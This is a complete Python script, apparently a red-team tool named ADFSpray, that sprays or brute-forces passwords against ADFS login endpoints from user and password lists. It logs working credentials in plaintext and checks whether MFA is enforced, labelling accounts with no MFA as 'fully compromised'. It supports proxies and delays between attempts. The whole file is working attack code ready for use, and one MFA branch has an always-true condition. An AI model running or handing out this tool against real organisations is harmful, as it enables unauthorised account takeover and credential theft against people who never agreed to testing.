import requests
import argparse
import re
import html
import time
import urllib3
from colorama import Fore, Style
from datetime import datetime


def print_banner():
    banner = f"""{Fore.GREEN}
   ___   ___  ________
  / _ | / _ \/ __/ __/__  _______ ___ __
 / __ |/ // / _/_\ \/ _ \/ __/ _ `/ // /
/_/ |_/____/_/ /___/ .__/_/  \_,_/\_, /
                  /_/            /___/

{Fore.YELLOW}Author: phish (@dunderhay){Style.RESET_ALL}
    """
    print(banner)


def parse_arguments():
    parser = argparse.ArgumentParser(
        description="ADFS Brute-Force Login Script",
        formatter_class=argparse.RawTextHelpFormatter,
        epilog="Usage examples:"
        "\n  python script.py -t https://adfs.example.com -u user -p password123"
        "\n  python script.py -t https://adfs.example.com -U userlist.txt -p password123 -mfa"
        "\n  python script.py -t https://adfs.example.com -u user -P passwordlist.txt -v -o output.txt"
        "\n  python script.py -t https://adfs.example.com -U userlist.txt -P passwordlist.txt -d 2"
        "\n\nNote: Provide either a single password (-p) or a password list file (-P).\n",
    )

    parser.add_argument(
        "-t",
        "--target",
        type=str,
        required=True,
        help="ADFS target host URL (e.g., https://adfs.example.com)",
    )
    parser.add_argument(
        "-u", "--username", type=str, required=False, help="Single username to try"
    )
    parser.add_argument(
        "-U",
        "--username-list",
        type=str,
        required=False,
        help="File containing a list of usernames",
    )
    parser.add_argument(
        "-p",
        "--password",
        type=str,
        required=False,
        help="Single password to use for login attempts",
    )
    parser.add_argument(
        "-P",
        "--password-list",
        type=str,
        required=False,
        help="File containing a list of passwords",
    )
    parser.add_argument(
        "-v",
        "--verbose",
        action="store_true",
        default=False,
        help="Enable verbose mode to show all print statements",
    )
    parser.add_argument(
        "--debug",
        action="store_true",
        default=False,
        help="Enable debug mode to show HTTP requests",
    )
    parser.add_argument(
        "-o",
        "--output",
        type=str,
        required=False,
        help="File to log the login results",
    )
    parser.add_argument(
        "-mfa",
        "--mfa",
        action="store_true",
        help="Check if Multi-Factor Authentication (MFA) is required after successful login",
    )
    parser.add_argument(
        "-d",
        "--delay",
        type=int,
        default=0,
        help="Delay in seconds between login attempts (e.g., --delay 2 for 2 seconds delay)",
    )

    parser.add_argument(
        "-x",
        "--proxy",
        type=str,
        required=False,
        help="Specify a proxy host to send all traffic through (e.g., http://your-proxy-host:port)",
    )

    return parser.parse_args()


headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
}


def log_message(message, log_file=None, color=None):
    timestamp = datetime.now().strftime("%d-%m-%Y %H:%M:%S")
    if color:
        print(f"[{timestamp}] {color}{message}{Style.RESET_ALL}")

    if log_file:
        with open(log_file, "a") as log:
            log.write(f"[{timestamp}] {message}" + "\n")


def extract_saml_assertion(adfs_login_response):
    wresult_pattern = r'<input type="hidden" name="wresult" value="([^"]+)" \/>'
    wresult_match = re.search(wresult_pattern, adfs_login_response.text, re.DOTALL)

    if wresult_match:
        wresult_value = wresult_match.group(1)
        wresult_value = html.unescape(wresult_value)
        return wresult_value
    else:
        return None


def check_authentication_cookies(login_srf_response):
    cookies = login_srf_response.cookies
    return "ESTSAUTHPERSISTENT" in cookies and "ESTSAUTH" in cookies


def perform_microsoft_mfa_check(session, login_response, username, log_file):
    wresult_value = extract_saml_assertion(login_response)

    if wresult_value:
        login_srf_url = "https://login.microsoftonline.com/login.srf"
        login_srf_payload = {
            "wa": "wsignin1.0",
            "wresult": wresult_value,
        }

        login_srf_response = session.post(
            login_srf_url,
            data=login_srf_payload,
            headers=headers,
            timeout=10,
        )
        if debug:
            print(f"{Fore.CYAN}[*] HTTP POST Request (Microsoft MFA):{Style.RESET_ALL}")
            print(f"    URL: {login_srf_url}")
            print(f"    Body: {login_srf_payload}")

        login_srf_response.raise_for_status()

        if debug:
            print(
                f"{Fore.CYAN}[*] HTTP POST Response (Microsoft MFA):{Style.RESET_ALL}"
            )
            print(f"    Status Code: {login_srf_response.status_code}")
            print(f"    Headers: {login_srf_response.request.headers}")
            print(f"    Cookies: {session.cookies.get_dict()}")
            print(f"    Body: {login_srf_response.text}")

        if login_srf_response.status_code == 200 and check_authentication_cookies(
            login_srf_response
        ):
            if "BeginAuth" in login_srf_response.text:
                log_message(
                    f"[-] MFA required for: {username}",
                    log_file,
                    color=Fore.RED,
                )
            elif "/kmsi" or "KmsiInterrupt" in login_srf_response.text:
                log_message(
                    f"[+] MFA not required for: {username}",
                    log_file,
                    color=Fore.GREEN,
                )
                log_message(
                    f"[+] 🍾 {username} is fully compromised 🤌 ",
                    log_file,
                    color=Fore.MAGENTA,
                )
            else:
                print(f"{Fore.RED}[!] Unknown response checking MFA.{Style.RESET_ALL}")
    else:
        print(
            f"{Fore.RED}[!] Could not extract SAML assertion for MFA check.{Style.RESET_ALL}"
        )


def perform_adfs_mfa_check(session, login_response, username, log_file):
    adfs_mfa_response = session.get(
        login_response.headers["Location"],
        headers=headers,
        timeout=10,
    )

    if debug:
        print(f"{Fore.CYAN}[*] HTTP GET Request (ADFS MFA):{Style.RESET_ALL}")
        print(f"    URL: {adfs_mfa_response.url}")
        print(f"    Headers: {adfs_mfa_response.request.headers}")
        print(f"    Cookies: {session.cookies.get_dict()}")

    adfs_mfa_response.raise_for_status()

    if debug:
        print(f"{Fore.CYAN}[*] HTTP GET Response (ADFS MFA):{Style.RESET_ALL}")
        print(f"    Status Code: {adfs_mfa_response.status_code}")
        print(f"    Headers: {adfs_mfa_response.request.headers}")
        print(f"    Cookies: {session.cookies.get_dict()}")
        print(f"    Body: {adfs_mfa_response.text}")

    if adfs_mfa_response.status_code == 200:
        if (
            "/kmsi" in adfs_mfa_response.text
            or "KmsiInterrupt" in adfs_mfa_response.text
        ):
            log_message(
                f"[+] MFA not required for: {username}",
                log_file,
                color=Fore.GREEN,
            )
            log_message(
                f"[+] 🍾 {username} is fully compromised 🤌 ",
                log_file,
                color=Fore.MAGENTA,
            )
        # This was the old case but now it appears that the ADFS endpoint might just redirect to Microsoft for MFA check
        elif "mfa" in adfs_mfa_response.text:
            log_message(
                f"[-] MFA required for: {username}",
                log_file,
                color=Fore.RED,
            )
        elif (
            'action="https://login.microsoftonline.com:443/login.srf"'
            in adfs_mfa_response.text
        ):
            if debug:
                print(
                    f"{Fore.CYAN}[*] ADFS has reverted to Microsoft for MFA check - this is new?{Style.RESET_ALL}"
                )
            perform_microsoft_mfa_check(session, adfs_mfa_response, username, log_file)
        else:
            print(f"{Fore.RED}[!] Unknown response checking MFA.{Style.RESET_ALL}")


def send_login_request(
    target,
    username,
    password,
    verbose=False,
    debug=False,
    log_file=None,
    check_mfa=False,
    proxy=None,
):
    microsoft_checks_mfa = False
    adfs_checks_mfa = False
    if verbose:
        log_message(f"[*] Trying login for {username}", log_file, color=Fore.WHITE)

    payload = {
        "UserName": username,
        "Password": password,
        "AuthMethod": "FormsAuthentication",
    }

    try:
        with requests.Session() as session:
            if proxy:
                urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
                session.proxies = {"http": proxy, "https": proxy}
                session.verify = False

            adfs_login_response = session.post(
                f"{target}/adfs/ls/?client-request-id=&wa=wsignin1.0&wtrealm=urn:federation:MicrosoftOnline&wctx=cbcxt=&username={username}",
                data=payload,
                headers=headers,
                timeout=10,
                allow_redirects=False,
            )

            if debug:
                print(
                    f"{Fore.CYAN}[*] HTTP POST Request (Initial Login):{Style.RESET_ALL}"
                )
                print(f"    URL: {adfs_login_response.url}")
                print(f"    Body: {payload}")

            adfs_login_response.raise_for_status()

            if debug:
                print(
                    f"{Fore.CYAN}[*] HTTP POST Response (Initial Login):{Style.RESET_ALL}"
                )
                print(f"    Status Code: {adfs_login_response.status_code}")
                print(f"    Headers: {adfs_login_response.request.headers}")
                print(f"    Cookies: {session.cookies.get_dict()}")
                print(f"    Body: {adfs_login_response.text}")

            if (
                adfs_login_response.status_code == 200
                and 'action="https://login.microsoftonline.com:443/login.srf"'
                in adfs_login_response.text
            ):
                microsoft_checks_mfa = True
                if debug:
                    print(f"{Fore.CYAN}[*] Microsoft checks MFA.{Style.RESET_ALL}")
                log_message(
                    f"[+] Login success: {username} : {password}",
                    log_file,
                    color=Fore.GREEN,
                )
            elif (
                adfs_login_response.status_code == 302
                and target in adfs_login_response.headers["Location"]
            ):
                adfs_checks_mfa = True
                if debug:
                    print(f"{Fore.CYAN}[*] ADFS endpoint checks MFA.{Style.RESET_ALL}")
                log_message(
                    f"[+] Login success: {username} : {password}",
                    log_file,
                    color=Fore.GREEN,
                )
            elif verbose:
                log_message(
                    f"[-] Login failed: {username} : {password}",
                    log_file,
                    color=Fore.RED,
                )

            if check_mfa:
                if microsoft_checks_mfa:
                    perform_microsoft_mfa_check(
                        session, adfs_login_response, username, log_file
                    )
                elif adfs_checks_mfa:
                    perform_adfs_mfa_check(
                        session, adfs_login_response, username, log_file
                    )

    except requests.exceptions.Timeout:
        print(f"{Fore.RED}[!] Request timed out.{Style.RESET_ALL}")
    except requests.exceptions.HTTPError as e:
        print(f"{Fore.RED}[!] HTTP Error occurred: {e}{Style.RESET_ALL}")
    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED}[!] Error occurred: {e}{Style.RESET_ALL}")


if __name__ == "__main__":
    args = parse_arguments()

    target = args.target
    usernames = []
    passwords = []
    log_file = args.output
    check_mfa = args.mfa
    verbose = args.verbose
    debug = args.debug
    delay = args.delay

    if args.username:
        usernames.append(args.username)

    if args.username_list:
        try:
            with open(args.username_list, "r") as users_file:
                usernames.extend(users_file.read().splitlines())
        except FileNotFoundError:
            print(
                f"{Fore.RED}[!] Username list file '{args.username_list}' not found.{Style.RESET_ALL}"
            )
            exit(1)

    if args.password:
        passwords.append(args.password)

    if args.password_list:
        try:
            with open(args.password_list, "r") as passwords_file:
                passwords.extend(passwords_file.read().splitlines())
        except FileNotFoundError:
            print(
                f"{Fore.RED}[!] Password list file '{args.password_list}' not found.{Style.RESET_ALL}"
            )
            exit(1)

    if not usernames:
        print(
            f"{Fore.RED}[!] No usernames provided. Please provide a username or a list of usernames.{Style.RESET_ALL}"
        )
        exit(1)

    if not passwords:
        print(
            f"{Fore.RED}[!] No passwords provided. Please provide a password or a list of passwords.{Style.RESET_ALL}"
        )
        exit(1)

    print_banner()
    log_message(f"[*] Target ADFS Host: {target}", log_file, color=Fore.CYAN)

    for username in usernames:
        for password in passwords:
            send_login_request(
                target,
                username.strip(),
                password.strip(),
                verbose=verbose,
                debug=debug,
                log_file=log_file,
                check_mfa=check_mfa,
                proxy=args.proxy,
            )
            if delay:
                time.sleep(delay)
